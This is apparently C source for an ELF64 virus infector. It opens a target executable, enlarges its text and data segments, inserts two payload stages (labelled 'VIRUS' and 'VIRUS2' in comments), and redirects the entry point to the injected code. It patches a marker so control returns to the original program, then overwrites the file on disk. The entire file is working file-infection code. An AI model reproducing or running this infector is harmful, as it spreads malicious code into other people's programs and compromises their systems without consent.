#include <stdio.h>
#include <stdlib.h>
#include <elf.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <unistd.h>
#include "politic.h"
#include "payload.h"

#define PAGE_SIZE 4096
#define TMP ".gripe"

int main(int argc, char **argv)
{
    Elf64_Off text_off = 0;
    Elf64_Addr text_vaddr;
    Elf64_Ehdr *ehdr;
    Elf64_Phdr *phdr;
    Elf64_Shdr *shdr;
    int host_fd, ofd;
    struct stat st;
    char *host_mem;

    if ((host_fd = open(argv[1], O_RDWR)) < 0)
        return 1;

    fstat(host_fd, &st);
    host_mem = mmap(NULL, st.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, host_fd, 0);
    close(host_fd);

    if (host_mem == NULL)
        return 2;

    ehdr = (Elf64_Ehdr *)host_mem;
    phdr = (Elf64_Phdr *)(host_mem + ehdr->e_phoff);
    shdr = (Elf64_Shdr *)(host_mem + ehdr->e_shoff);
    Elf64_Addr original_entry;
    Elf64_Addr new_entry, data_vaddr;
    unsigned long end_of_text;
    unsigned long end_of_data = ~(0UL);
    unsigned long bss_size;

    for (int i = 0; i < ehdr->e_phnum; i++)
    {
        if (phdr[i].p_type == PT_LOAD && phdr[i].p_flags == (PF_X | PF_R))
        {
            original_entry = ehdr->e_entry - phdr[i].p_vaddr + phdr[i].p_offset;
            end_of_text = phdr[i].p_offset + phdr[i].p_filesz;
            new_entry = phdr[i].p_vaddr + phdr[i].p_memsz + politic_entry;
            phdr[i].p_memsz += politic_len;
            phdr[i].p_filesz += politic_len;
            for (int j = i + 1; j < ehdr->e_phnum; j++)
            {
                if (phdr[j].p_type == PT_LOAD && phdr[j].p_flags == (PF_R | PF_W))
                {
                    printf("data here! at %d index\n", j);
                    printf("data off = %lu\n", phdr[j].p_offset);
                    printf("data filesz = %lu\n", phdr[j].p_filesz);
                    printf("bss size = %lu\n",phdr[j].p_memsz - phdr[j].p_filesz);
                    
                    bss_size = phdr[j].p_memsz - phdr[j].p_filesz;
                    end_of_data = phdr[j].p_offset + phdr[j].p_filesz;
                    data_vaddr = phdr[j].p_vaddr + phdr[j].p_filesz;
                    phdr[j].p_offset += PAGE_SIZE;
                    phdr[j].p_memsz += payload_len+bss_size;
                    phdr[j].p_filesz += payload_len+bss_size;
                }
                else if (phdr[j].p_offset > end_of_text)
                {
                    phdr[j].p_offset += PAGE_SIZE;
                }
            }
            break;
        }
    }

    for (int i = 0; i < ehdr->e_shnum; i++)
    {
        Elf64_Off tmp_off = shdr[i].sh_offset;
                
        if (tmp_off == end_of_data && shdr[i].sh_type == SHT_NOBITS)
        {
            printf(".bss here! at index %d!\n", i);
            shdr[i-1].sh_size+=payload_len+bss_size;
            shdr[i].sh_offset = shdr[i-1].sh_offset + shdr[i-1].sh_size;
            shdr[i].sh_addr = shdr[i-1].sh_addr + shdr[i-1].sh_size;
            continue;
        }
        
        if (tmp_off >= end_of_data && shdr[i].sh_type)
        {
            shdr[i].sh_offset += payload_len+bss_size;
        }

        if (tmp_off > end_of_text && shdr[i].sh_type)
        {
            shdr[i].sh_offset += PAGE_SIZE;
        }
        else if (shdr[i].sh_addr + shdr[i].sh_size == new_entry)
            shdr[i].sh_size += politic_len;
    }

    ehdr->e_entry = new_entry;
    ehdr->e_shoff += PAGE_SIZE + payload_len + bss_size;

    printf("eot = %lu\n", end_of_text);
    printf("eod = %lu\n", end_of_data);

    char *real_entry = politic;
    unsigned long patch_offset;
    for (int s = 0; s < politic_len; s++)
    {
        if (*(unsigned int *)(real_entry + s) == 0xbebacafe)
        {
            printf("offset of patch is %d\n", s);
            real_entry = real_entry + s;
            patch_offset = s;
            break;
        }
    }

    //Patching the jmp ORIGINAL_ENTRY_POINT
    *(uint32_t *)real_entry = -end_of_text + original_entry - patch_offset - 4;
    //Saving the offset of patch in the payload
    *(uint32_t *)(real_entry + 4) = (uint8_t *)real_entry - politic;
    //Saving offset of payload entry on payload
    *(uint64_t *)(real_entry + 8) = politic_entry;
    //Saving the payload size in payload
    *(uint64_t *)(real_entry + 16) = politic_len;
    //Patch the addr of the second payload
    *(uint64_t *)(real_entry + 24) = (data_vaddr - new_entry) + bss_size;
    //Save second stage entry
    *(uint64_t *)(real_entry + 32) = payload_entry;
    //Save second stage len
    *(uint64_t *)(real_entry + 40) = payload_len;

    printf("offset from end of text to end_of_data = %lu\n", end_of_data - end_of_text);
    printf("off end_datavaddr - newentry =%lu\n", data_vaddr - new_entry);
    ofd = open(TMP, O_CREAT | O_WRONLY | O_TRUNC,
               S_IRUSR | S_IXUSR | S_IWUSR);

    write(ofd, host_mem, end_of_text);
    //[EHDR][PHDRs][TEXT]
    write(ofd, politic, politic_len);
    //[EHDR][PHDRs][TEXT][VIRUS]
    lseek(ofd, PAGE_SIZE - politic_len, SEEK_CUR);
    //[EHDR][PHDRs][TEXT][VIRUS+PAD]
    write(ofd, host_mem + end_of_text, end_of_data - end_of_text);
    //[EHDR][PHDRs][TEXT][VIRUS+PAD][DATA]
    lseek(ofd, bss_size, SEEK_CUR);
    //[EHDR][PHDRs][TEXT][VIRUS+PAD][DATA][BSS]
    write(ofd, payload, payload_len);
    //[EHDR][PHDRs][TEXT][VIRUS+PAD][DATA][BSS][VIRUS2]
    write(ofd, host_mem + end_of_data, st.st_size - end_of_data);
    //[EHDR][PHDRs][TEXT][VIRUS+PAD][DATA][BSS][VIRUS2][SHDRs]

    close(ofd);
    munmap(host_mem, st.st_size);
    rename(TMP, argv[1]);
    return 0;
}